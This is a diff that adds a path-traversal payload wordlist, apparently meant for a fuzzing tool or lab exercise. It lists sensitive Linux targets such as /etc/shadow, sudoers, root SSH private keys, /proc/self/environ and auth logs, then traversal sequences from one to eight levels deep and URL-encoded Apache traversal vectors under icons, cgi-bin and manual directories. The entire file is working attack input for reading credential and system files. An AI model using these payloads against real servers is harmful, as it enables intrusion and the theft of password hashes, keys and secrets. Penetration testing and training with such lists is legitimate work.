@@ -1,0 +1,176 @@
+# ==========================================
+# 1. STANDARD ABSOLUTE SYSTEM PATHS
+# ==========================================
+etc/passwd
+etc/shadow
+etc/group
+etc/gshadow
+etc/hosts
+etc/resolv.conf
+etc/issue
+etc/os-release
+etc/crontab
+etc/fstab
+etc/network/interfaces
+etc/hostname
+etc/timezone
+etc/localtime
+etc/nsswitch.conf
+etc/environment
+etc/profile
+etc/bash.bashrc
+etc/sudoers
+etc/security/limits.conf
+etc/security/access.conf
+etc/ssh/sshd_config
+etc/ssh/ssh_config
+etc/apache2/apache2.conf
+etc/apache2/ports.conf
+etc/apache2/sites-available/000-default.conf
+etc/php/php.ini
+
+# ==========================================
+# 2. PROC & SYS FILESYSTEM INFORMATION
+# ==========================================
+proc/version
+proc/cpuinfo
+proc/meminfo
+proc/uptime
+proc/loadavg
+proc/self/cmdline
+proc/self/environ
+proc/self/status
+proc/self/maps
+proc/self/mounts
+proc/net/tcp
+proc/net/udp
+proc/net/fib_trie
+proc/net/arp
+proc/net/route
+
+# ==========================================
+# 3. LOGS & TEMPORARY FILES
+# ==========================================
+var/log/syslog
+var/log/auth.log
+var/log/kern.log
+var/log/dmesg
+var/log/apache2/access.log
+var/log/apache2/error.log
+var/log/dpkg.log
+var/log/faillog
+var/log/lastlog
+tmp/
+var/tmp/
+
+# ==========================================
+# 4. USER HISTORIES & KEYS
+# ==========================================
+root/.bash_history
+root/.ssh/id_rsa
+root/.ssh/id_rsa.pub
+root/.ssh/authorized_keys
+home/student/.bash_history
+home/student/.ssh/id_rsa
+home/student/.config/
+
+# ==========================================
+# 5. MULTI-LEVEL TRAVERSAL (1 to 8 levels)
+# ==========================================
+# Level 1
+../etc/passwd
+../etc/shadow
+../etc/hosts
+../etc/group
+../etc/issue
+../proc/version
+
+# Level 2
+../../etc/passwd
+../../etc/shadow
+../../etc/hosts
+../../etc/group
+../../etc/issue
+../../proc/version
+../../proc/self/environ
+
+# Level 3
+../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../etc/group
+../../../etc/issue
+../../../proc/version
+../../../proc/self/environ
+
+# Level 4
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../etc/group
+../../../../etc/issue
+../../../../proc/version
+../../../../proc/self/environ
+
+# Level 5
+../../../../../etc/passwd
+../../../../../etc/shadow
+../../../../../etc/hosts
+../../../../../etc/group
+../../../../../etc/issue
+../../../../../proc/version
+
+# Level 6
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../etc/hosts
+../../../../../../etc/group
+../../../../../../etc/issue
+
+# Level 7
+../../../../../../../etc/passwd
+../../../../../../../etc/shadow
+../../../../../../../etc/hosts
+
+# Level 8
+../../../../../../../../etc/passwd
+../../../../../../../../etc/shadow
+../../../../../../../../etc/hosts
+
+# ==========================================
+# 6. ENCODED & BASE-DIR VARIATIONS (Apache Vectors)
+# ==========================================
+# Icons directory base
+icons/.%2e/%2e%2e/etc/passwd
+icons/.%2e/%2e%2e/etc/shadow
+icons/.%2e/%2e%2e/etc/hosts
+icons/.%2e/%2e%2e/proc/version
+icons/.%2e/%2e%2e/%2e%2e/etc/passwd
+icons/.%2e/%2e%2e/%2e%2e/etc/shadow
+icons/.%2e/%2e%2e/%2e%2e/etc/hosts
+icons/.%2e/%2e%2e/%2e%2e/proc/version
+icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts
+icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/group
+icons/.%2e/%2e%2e/%2e%2e/%2e%2e/proc/version
+icons/.%2e/%2e%2e/%2e%2e/%2e%2e/proc/self/environ
+icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+
+# CGI-bin directory base
+cgi-bin/.%2e/%2e%2e/etc/passwd
+cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd
+cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# Manual directory base
+manual/.%2e/%2e%2e/etc/passwd
+manual/.%2e/%2e%2e/%2e%2e/etc/passwd
+manual/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# URL-encoded dot variations (%2e%2e%2f)
+icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts
+icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version
+icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/self/environ
